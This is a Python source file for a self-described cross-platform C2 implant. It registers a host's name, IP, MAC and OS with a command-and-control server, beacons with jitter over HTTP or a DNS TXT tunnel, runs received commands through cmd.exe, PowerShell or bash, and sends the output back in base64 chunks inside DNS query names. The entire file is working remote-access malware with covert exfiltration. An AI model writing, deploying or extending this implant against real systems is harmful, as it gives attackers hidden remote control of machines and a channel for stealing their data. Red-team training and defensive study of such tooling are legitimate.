#!/usr/bin/env python3
"""
C2 Client / Implant — Cross-platform (Windows + Linux)

Registers with the C2 server, beacons for commands, executes them,
and reports results back.  Designed to run as a single standalone file
with zero third-party dependencies (stdlib only).

Usage:
    python client.py                          # defaults
    python client.py --server 10.0.0.1:8000   # custom C2
    python client.py --interval 5             # 5-second beacon
"""

import argparse
import base64
import json
import os
import platform
import random
import socket
import struct
import subprocess
import sys
import time
import urllib.error
import urllib.request
import uuid


# ── Configuration ─────────────────────────────────────────────────────

# Resolve from env var, fallback to hardcoded default
DEFAULT_C2_SERVER = os.environ.get("C2_SERVER", "127.0.0.1:8000")
DEFAULT_BEACON_INTERVAL = int(os.environ.get("C2_INTERVAL", "10"))
DEFAULT_JITTER = float(os.environ.get("C2_JITTER", "0.3"))
DEFAULT_COMMUNICATION_CHANNEL = os.environ.get("C2_CHANNEL", "http")
DEFAULT_DNS_DOMAIN = os.environ.get("C2_DNS_DOMAIN", "c2.local")
DEFAULT_DNS_PORT = int(os.environ.get("C2_DNS_PORT", "15353"))
API_PREFIX = "/api/v1/agent"

DNS_CHUNK_SIZE = 50  # max chars per label in result queries


# ── Helpers ───────────────────────────────────────────────────────────

def _url(server: str, path: str) -> str:
    return f"http://{server}{API_PREFIX}{path}"


def _post(url: str, data: dict, retries: int = 3) -> dict | None:
    body = json.dumps(data).encode()
    req = urllib.request.Request(
        url, data=body, headers={"Content-Type": "application/json"},
    )
    for attempt in range(retries):
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                return json.loads(resp.read().decode())
        except Exception:
            if attempt < retries - 1:
                time.sleep(2)
    return None


def _get(url: str, retries: int = 3) -> dict | None:
    req = urllib.request.Request(url)
    for attempt in range(retries):
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                return json.loads(resp.read().decode())
        except Exception:
            if attempt < retries - 1:
                time.sleep(2)
    return None


# ── DNS helpers ──────────────────────────────────────────────────────

def _build_dns_query(qname: str, qtype: int = 16) -> bytes:
    """Build a minimal DNS query packet (stdlib only). qtype 16 = TXT."""
    txn_id = struct.pack("!H", random.randint(0, 0xFFFF))
    flags = struct.pack("!H", 0x0100)  # standard query, RD=1
    counts = struct.pack("!HHHH", 1, 0, 0, 0)  # 1 question

    # Encode QNAME
    qname_bytes = b""
    for label in qname.split("."):
        encoded = label.encode()
        qname_bytes += struct.pack("B", len(encoded)) + encoded
    qname_bytes += b"\x00"

    question = qname_bytes + struct.pack("!HH", qtype, 1)  # QTYPE, QCLASS IN
    return txn_id + flags + counts + question


def _parse_txt_response(data: bytes) -> list[bytes]:
    """Extract TXT record strings from a DNS response (minimal parser)."""
    if len(data) < 12:
        return []
    qdcount = struct.unpack("!H", data[4:6])[0]
    ancount = struct.unpack("!H", data[6:8])[0]

    # Skip header (12 bytes) then skip question section
    offset = 12
    for _ in range(qdcount):
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if length >= 0xC0:  # compression pointer
                offset += 2
                break
            offset += 1 + length
        offset += 4  # QTYPE + QCLASS

    # Parse answer RRs
    txt_strings: list[bytes] = []
    for _ in range(ancount):
        if offset >= len(data):
            break
        # Skip NAME (may be compressed)
        if data[offset] >= 0xC0:
            offset += 2
        else:
            while offset < len(data) and data[offset] != 0:
                offset += 1 + data[offset]
            offset += 1

        if offset + 10 > len(data):
            break
        rtype = struct.unpack("!H", data[offset:offset + 2])[0]
        rdlength = struct.unpack("!H", data[offset + 8:offset + 10])[0]
        offset += 10

        if rtype == 16:  # TXT
            end = offset + rdlength
            pos = offset
            while pos < end:
                slen = data[pos]
                pos += 1
                txt_strings.append(data[pos:pos + slen])
                pos += slen
        offset += rdlength

    return txt_strings


def _dns_query(qname: str, server_ip: str, port: int, retries: int = 3) -> list[bytes]:
    """Send a DNS TXT query and return the TXT strings from the response."""
    packet = _build_dns_query(qname)
    print(f"[+] Sending DNS query for {qname} to {server_ip}:{port}")
    for attempt in range(retries):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(10)
            sock.sendto(packet, (server_ip, port))
            data, _ = sock.recvfrom(4096)
            sock.close()
            return _parse_txt_response(data)
        except Exception:
            if attempt < retries - 1:
                time.sleep(2)
    return []


# ── System information ────────────────────────────────────────────────

def get_hostname() -> str:
    return socket.gethostname()


def get_os() -> str:
    return f"{platform.system()} {platform.release()}"


def get_ip() -> str:
    """Best-effort LAN IP."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def get_mac() -> str:
    mac = uuid.getnode()
    return ":".join(f"{(mac >> (8 * i)) & 0xFF:02x}" for i in reversed(range(6)))


# ── Command execution ─────────────────────────────────────────────────

def execute_command(command: str) -> str:
    """Run *command* in a shell and return combined stdout+stderr."""
    try:
        if platform.system() == "Windows":
            # If the command is a PowerShell EncodedCommand, run it directly
            if command.strip().lower().startswith("powershell"):
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    timeout=300,
                )
            else:
                result = subprocess.run(
                    ["cmd.exe", "/c", command],
                    capture_output=True,
                    timeout=300,
                )
        else:
            # Linux / macOS
            result = subprocess.run(
                command,
                shell=True,
                executable="/bin/bash",
                capture_output=True,
                timeout=300,
            )
        output = result.stdout.decode(errors="replace")
        if result.stderr:
            output += "\n" + result.stderr.decode(errors="replace")
        return output.strip()
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 300 s"
    except Exception as exc:
        return f"[ERROR] {exc}"


# ── Channel pattern ──────────────────────────────────────────────────

class Channel:
    """Base class defining the communication interface."""

    def register(self) -> str | None:
        raise NotImplementedError

    def beacon(self, target_id: str) -> tuple[list[dict], int, float]:
        raise NotImplementedError

    def report(self, target_id: str, command_id: str, output: str) -> None:
        raise NotImplementedError


class HttpChannel(Channel):
    def __init__(self, server: str) -> None:
        self._server = server

    def register(self) -> str | None:
        data = {
            "hostname": get_hostname(),
            "ip_address": get_ip(),
            "mac_address": get_mac(),
            "os": get_os(),
            "communication_channel": "http",
        }
        resp = _post(_url(self._server, "/register"), data)
        if resp and "target_id" in resp:
            return resp["target_id"]
        return None

    def beacon(self, target_id: str) -> tuple[list[dict], int, float]:
        resp = _get(_url(self._server, f"/{target_id}/commands"))
        if resp and "commands" in resp:
            return (
                resp["commands"],
                int(resp.get("sleep", DEFAULT_BEACON_INTERVAL)),
                float(resp.get("jitter", DEFAULT_JITTER)),
            )
        return [], DEFAULT_BEACON_INTERVAL, DEFAULT_JITTER

    def report(self, target_id: str, command_id: str, output: str) -> None:
        _post(
            _url(self._server, f"/{target_id}/commands/{command_id}/result"),
            {"output": output},
        )


class DnsChannel(Channel):
    def __init__(self, server_ip: str, port: int, domain: str) -> None:
        self._server_ip = server_ip
        self._port = port
        self._domain = domain

    def register(self) -> str | None:
        data = {
            "hostname": get_hostname(),
            "ip_address": get_ip(),
            "mac_address": get_mac(),
            "os": get_os(),
            "communication_channel": "dns",
        }
        b64_data = base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")
        chunks = [b64_data[i:i + DNS_CHUNK_SIZE] for i in range(0, len(b64_data), DNS_CHUNK_SIZE)]
        if not chunks:
            chunks = [""]
        total = len(chunks)
        # Send all chunks except the last one (no useful response expected)
        for idx in range(total - 1):
            qname = f"{chunks[idx]}.{idx}.{total}.reg.{self._domain}"
            _dns_query(qname, self._server_ip, self._port)
            time.sleep(0.05)
        # Send the last chunk — the server responds with the target_id
        last_idx = total - 1
        qname = f"{chunks[last_idx]}.{last_idx}.{total}.reg.{self._domain}"
        txt_records = _dns_query(qname, self._server_ip, self._port)
        if not txt_records:
            return None
        try:
            resp_b64 = b"".join(txt_records).decode(errors="replace")
            resp = json.loads(base64.b64decode(resp_b64 + "==").decode())
            return resp.get("target_id")
        except Exception:
            return None

    def beacon(self, target_id: str) -> tuple[list[dict], int, float]:
        qname = f"{target_id}.poll.{self._domain}"
        txt_records = _dns_query(qname, self._server_ip, self._port)
        print(f"TXT RECORDS for {target_id}: {txt_records}")
        if not txt_records:
            return [], DEFAULT_BEACON_INTERVAL, DEFAULT_JITTER

        b64_data = b"".join(txt_records).decode(errors="replace")
        try:
            payload = json.loads(base64.b64decode(b64_data + "==").decode())
        except Exception:
            return [], DEFAULT_BEACON_INTERVAL, DEFAULT_JITTER

        sleep_val = int(payload.get("sleep", DEFAULT_BEACON_INTERVAL))
        jitter_val = float(payload.get("jitter", DEFAULT_JITTER))

        if "id" in payload:
            cmd = {"id": payload["id"], "command": payload.get("command", "")}
            return [cmd], sleep_val, jitter_val
        return [], sleep_val, jitter_val

    def report(self, target_id: str, command_id: str, output: str) -> None:
        b64_output = base64.urlsafe_b64encode(output.encode()).decode().rstrip("=")
        chunks = [b64_output[i:i + DNS_CHUNK_SIZE] for i in range(0, len(b64_output), DNS_CHUNK_SIZE)]
        if not chunks:
            chunks = [""]
        total = len(chunks)
        for idx, chunk in enumerate(chunks):
            qname = f"{chunk}.{idx}.{total}.{command_id}.res.{self._domain}"
            _dns_query(qname, self._server_ip, self._port)
            time.sleep(0.05)


CHANNELS: dict[str, type[Channel]] = {
    "http": HttpChannel,
    "dns": DnsChannel,
}


def _build_channel(name: str, server: str, dns_domain: str, dns_port: int) -> Channel:
    if name == "dns":
        return DnsChannel(server.split(":")[0], dns_port, dns_domain)
    return HttpChannel(server)


# ── Main loop ─────────────────────────────────────────────────────────

def run(server: str, interval: int, jitter: float, channel_name: str = "http",
        dns_domain: str = DEFAULT_DNS_DOMAIN, dns_port: int = DEFAULT_DNS_PORT) -> None:
    channel = _build_channel(channel_name, server, dns_domain, dns_port)

    print(f"[*] C2 Client starting — server {server}, channel {channel_name}, beacon {interval}s")

    # ── Registration loop ──
    target_id: str | None = None
    while target_id is None:
        print("[*] Registering …")
        target_id = channel.register()
        if target_id:
            print(f"[+] Registered as {target_id}")
        else:
            print("[-] Registration failed, retrying …")
            time.sleep(interval)

    # ── Beacon loop ──
    while True:
        try:
            commands, interval, jitter = channel.beacon(target_id)
            for cmd in commands:
                cmd_id = cmd.get("id", "")
                cmd_str = cmd.get("command", "")
                if not cmd_str:
                    continue
                print(f"[>] Executing command {cmd_id[:8]}…")
                output = execute_command(cmd_str)
                print(f"[<] Result ({len(output)} bytes)")
                channel.report(target_id, cmd_id, output)
        except Exception as exc:
            print(f"[-] Beacon error: {exc}")

        sleep_time = interval * random.uniform(1 - jitter, 1 + jitter)
        time.sleep(max(1, sleep_time))


# ── Entry point ───────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="C2 Implant Client")
    parser.add_argument(
        "--server", "-s", default=DEFAULT_C2_SERVER,
        help=f"C2 server address (default: {DEFAULT_C2_SERVER})",
    )
    parser.add_argument(
        "--interval", "-i", type=int, default=DEFAULT_BEACON_INTERVAL,
        help=f"Beacon interval in seconds (default: {DEFAULT_BEACON_INTERVAL})",
    )
    parser.add_argument(
        "--jitter", "-j", type=float, default=DEFAULT_JITTER,
        help=f"Jitter factor 0-1 (default: {DEFAULT_JITTER})",
    )
    parser.add_argument(
        "--channel", "-c", default=DEFAULT_COMMUNICATION_CHANNEL,
        choices=["http", "dns"],
        help=f"Communication channel (default: {DEFAULT_COMMUNICATION_CHANNEL})",
    )
    parser.add_argument(
        "--dns-domain", default=DEFAULT_DNS_DOMAIN,
        help=f"DNS C2 domain (default: {DEFAULT_DNS_DOMAIN})",
    )
    parser.add_argument(
        "--dns-port", type=int, default=DEFAULT_DNS_PORT,
        help=f"DNS server port (default: {DEFAULT_DNS_PORT})",
    )
    args = parser.parse_args()
    run(args.server, args.interval, args.jitter,
        channel_name=args.channel, dns_domain=args.dns_domain, dns_port=args.dns_port)


if __name__ == "__main__":
    main()
